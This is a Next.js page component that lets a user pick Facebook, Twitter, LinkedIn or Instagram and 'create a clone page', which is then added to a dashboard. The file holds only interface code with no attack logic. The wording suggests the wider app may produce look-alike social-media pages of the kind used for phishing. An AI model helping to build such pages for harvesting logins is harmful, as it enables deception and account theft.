'use client';
import { useRouter } from 'next/navigation';
import { useClones } from '@/hooks/use-clones';
import { useToast } from '@/hooks/use-toast';
import { Button } from '@/components/ui/button';
import {
  Card,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { Facebook, Twitter, Linkedin, Instagram } from 'lucide-react';
import type { Platform } from '@/lib/types';

const platforms = [
  {
    name: 'Facebook',
    id: 'facebook',
    icon: <Facebook className="h-8 w-8" />,
    style: 'text-blue-600',
  },
  {
    name: 'Twitter',
    id: 'twitter',
    icon: <Twitter className="h-8 w-8" />,
    style: 'text-sky-500',
  },
  {
    name: 'LinkedIn',
    id: 'linkedin',
    icon: <Linkedin className="h-8 w-8" />,
    style: 'text-blue-800',
  },
  {
    name: 'Instagram',
    id: 'instagram',
    icon: <Instagram className="h-8 w-8" />,
    style: 'text-pink-500',
  },
] as const;

export default function NewClonePage() {
  const router = useRouter();
  const { addClone } = useClones();
  const { toast } = useToast();

  const handleCreateClone = (platform: Platform) => {
    addClone(platform);
    toast({
      title: 'Clone Created!',
      description: `A new ${platform.charAt(0).toUpperCase() + platform.slice(1)} clone has been added to your dashboard.`,
    });
    router.push('/dashboard');
  };

  return (
    <div className="container mx-auto py-6">
      <div className="text-center mb-8">
        <p className="text-lg text-muted-foreground">
          Select a platform to create a clone page.
        </p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 max-w-4xl mx-auto">
        {platforms.map((platform) => (
          <Card
            key={platform.id}
            className="group hover:border-primary hover:shadow-lg transition-all"
          >
            <button
              onClick={() => handleCreateClone(platform.id)}
              className="w-full text-left p-0"
            >
              <CardHeader className="flex flex-col items-center justify-center text-center p-8">
                <div
                  className={`p-4 bg-accent/10 rounded-full mb-4 ${platform.style}`}
                >
                  {platform.icon}
                </div>
                <CardTitle className="font-headline">{platform.name}</CardTitle>
              </CardHeader>
            </button>
          </Card>
        ))}
      </div>
    </div>
  );
}
